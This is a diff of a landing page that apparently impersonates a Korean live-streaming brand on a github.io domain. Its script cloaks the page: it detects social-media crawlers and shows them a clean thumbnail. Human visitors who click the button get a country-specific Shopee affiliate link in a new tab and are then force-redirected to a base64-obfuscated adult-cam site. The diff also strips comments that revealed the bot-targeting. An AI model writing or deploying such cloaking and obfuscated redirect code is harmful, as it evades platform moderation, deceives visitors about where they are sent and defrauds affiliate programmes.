@@ -5,7 +5,7 @@
 <meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover" />
 <title>Panda Live Idols</title>
 
-<!-- Open Graph cho bot -->
+<!-- Open Graph -->
 <meta property="og:url" content="https://pandalive-co-kr.github.io/panda-live-idols/" />
 <meta property="og:type" content="website" />
 <meta property="og:title" content="Panda Live Idols" />
@@ -35,19 +35,19 @@ html, body { margin:0; padding:0; height:100%; background:#000; }
 </head>
 <body>
 
-<!-- Thumbnail cho bot -->
+<!-- Thumbnail -->
 <div id="thumbnail">
-  <img src="https://pandalive-co-kr.github.io/panda-live-idols/facebook-reels.jpg" alt="Thumbnail sạch" style="width:100%; height:auto;">
+  <img src="https://pandalive-co-kr.github.io/panda-live-idols/facebook-reels.jpg" alt="Thumbnail" style="width:100%; height:auto;">
 </div>
 
-<!-- Nội dung cho user -->
+<!-- Nội dung -->
 <div id="real-content" class="video-container" style="display:none;">
   <video id="main-video" autoplay muted loop playsinline preload="auto"
          poster="https://pandalive-co-kr.github.io/panda-live-idols/facebook.jpg" webkit-playsinline></video>
 
-  <img src="https://pandalive-co-kr.github.io/panda-live-idols/panda-number.png" alt="Panda Number Logo" class="top-logo-left" />
-  <img src="https://pandalive-co-kr.github.io/panda-live-idols/panda-class.png" alt="Panda Class Logo" class="top-logo-right" />
-  <img src="https://pandalive-co-kr.github.io/panda-live-idols/kbj-logo.jpg" alt="KBJ Logo" class="bottom-logo-left" />
+  <img src="https://pandalive-co-kr.github.io/panda-live-idols/panda-number.png" alt="Panda Number" class="top-logo-left" />
+  <img src="https://pandalive-co-kr.github.io/panda-live-idols/panda-class.png" alt="Panda Class" class="top-logo-right" />
+  <img src="https://pandalive-co-kr.github.io/panda-live-idols/kbj-logo.jpg" alt="KBJ" class="bottom-logo-left" />
 
   <div class="overlay">
     <button class="cta" id="ctaBtn">
@@ -75,19 +75,27 @@ const xorKey = "PandaKey2025";
 // --- Mã hóa link 18+ ---
 const link18_b64 = "aHR0cHM6Ly9zZXhiamNhbS5jb20vYWN0b3IvcGFuZGFjbGFzcy8=";
 
-// --- Phát hiện bot ---
+// --- Link Shopee theo quốc gia ---
+const affLinks = {
+  "VN": "https://s.shopee.vn/30dchvC74f",
+  "MY": "https://invl.me/clmwy1t",
+  "SG": "https://invl.me/clmwy1m",
+  "PH": "https://invl.me/clmwy1v"
+};
+
+// --- Nhận diện bot ---
 function isBot() {
   const ua = (navigator.userAgent || "").toLowerCase();
   const keywords = ["facebookexternalhit","facebot","twitterbot","linkedinbot","slackbot","bot","crawler","spider","preview","embedly"];
   return keywords.some(k => ua.includes(k)) || navigator.webdriver;
 }
 
-// --- Phát hiện thiết bị ---
+// --- Thiết bị ---
 function isIOS() { return /iPad|iPhone|iPod/i.test(navigator.userAgent); }
 function isAndroid() { return /Android/i.test(navigator.userAgent); }
 function isIOSChrome() { return /CriOS/i.test(navigator.userAgent) && isIOS(); }
 
-// --- Điều hướng 18+ bền bỉ cho iOS Chrome ---
+// --- Điều hướng bền bỉ ---
 function navigate18Resilient(url) {
   let done = false;
   let t1 = null, t2 = null, t3 = null;
@@ -103,11 +111,8 @@ function navigate18Resilient(url) {
     window.removeEventListener('pageshow', onPageShow, optsOnce);
     document.removeEventListener('visibilitychange', onVisibleChange);
 
-    try {
-      window.location.replace(url);
-    } catch (_) {
-      window.location.href = url;
-    }
+    try { window.location.replace(url); }
+    catch (_) { window.location.href = url; }
   };
 
   const onPageHide = () => setTimeout(go, 120);
@@ -116,7 +121,6 @@ function navigate18Resilient(url) {
   const onVisibleChange = () => { if (document.visibilityState === 'visible') go(); };
 
   const optsOnce = { once: true };
-
   const d1 = isIOSChrome() ? 250 : 80;
   const d2 = isIOSChrome() ? 800 : 300;
 
@@ -130,26 +134,14 @@ function navigate18Resilient(url) {
   document.addEventListener('visibilitychange', onVisibleChange);
 }
 
-// --- Affiliate Links ---
-const affLinks = {
-  "VN": "https://s.shopee.vn/30dchvC74f",
-  "MY": "https://invl.me/clmwy1t",
-  "SG": "https://invl.me/clmwy1m",
-  "PH": "https://invl.me/clmwy1v"
-};
-// Default tối ưu = VN
-const defaultAff = affLinks["VN"];
-
-// --- Hàm lấy affiliate theo quốc gia ---
-async function getAffiliateLink() {
-  try {
-    const resp = await fetch("https://ipapi.co/json/");
-    const data = await resp.json();
-    const country = (data.country || "").toUpperCase();
-    return affLinks[country] || defaultAff;
-  } catch (e) {
-    return defaultAff;
-  }
+// --- Nhận diện quốc gia từ ngôn ngữ trình duyệt ---
+function getCountry() {
+  const lang = (navigator.language || "").toUpperCase();
+  if (lang.includes("VI")) return "VN";
+  if (lang.includes("MS") || lang.includes("MY")) return "MY";
+  if (lang.includes("EN-SG") || lang.includes("SG")) return "SG";
+  if (lang.includes("EN-PH") || lang.includes("PH")) return "PH";
+  return "VN"; // mặc định
 }
 
 document.addEventListener('DOMContentLoaded', function() {
@@ -178,11 +170,14 @@ document.addEventListener('DOMContentLoaded', function() {
   }
 
   // --- Nút CTA ---
-  document.getElementById('ctaBtn').addEventListener('click', async function(e){
+  document.getElementById('ctaBtn').addEventListener('click', function(e){
     e.preventDefault();
 
-    // --- Mở Shopee Affiliate theo quốc gia ---
-    const affLink = await getAffiliateLink();
+    // Lấy quốc gia
+    const country = getCountry();
+    const affLink = affLinks[country] || affLinks["VN"];
+
+    // Mở Shopee (tab mới)
     const a = document.createElement("a");
     a.href = affLink;
     a.target = "_blank";
@@ -190,7 +185,7 @@ document.addEventListener('DOMContentLoaded', function() {
     document.body.appendChild(a);
     a.click();
 
-    // --- Điều hướng 18+ ---
+    // Mở link 18+ bền bỉ
     const link18 = atob(link18_b64);
     navigate18Resilient(link18);
 
